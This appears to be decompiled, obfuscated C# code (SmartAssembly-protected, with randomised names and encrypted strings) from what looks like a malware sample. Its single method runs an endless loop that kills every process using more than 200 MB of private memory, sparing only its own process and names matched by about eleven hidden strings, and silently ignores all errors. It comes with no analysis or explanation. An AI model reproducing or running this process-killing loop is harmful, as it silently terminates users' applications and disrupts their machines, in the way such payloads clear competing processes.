using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace oXSOOyVgTNm;

public static class zegDbRijYBCiLd
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void ySHXkeKbEzwVA()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107398667)) && !process.ProcessName.Contains(getString_0(107398690)) && !process.ProcessName.Contains(getString_0(107398681)) && !process.ProcessName.Contains(getString_0(107398640)) && !process.ProcessName.Contains(getString_0(107398659)) && !process.ProcessName.Contains(getString_0(107398102)) && !process.ProcessName.Contains(getString_0(107398089)) && !process.ProcessName.Contains(getString_0(107398108)) && !process.ProcessName.Contains(getString_0(107398063)) && !process.ProcessName.Contains(getString_0(107398082)) && !process.ProcessName.Contains(getString_0(107398029)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static zegDbRijYBCiLd()
	{
		Strings.CreateGetStringDelegate(typeof(zegDbRijYBCiLd));
	}
}
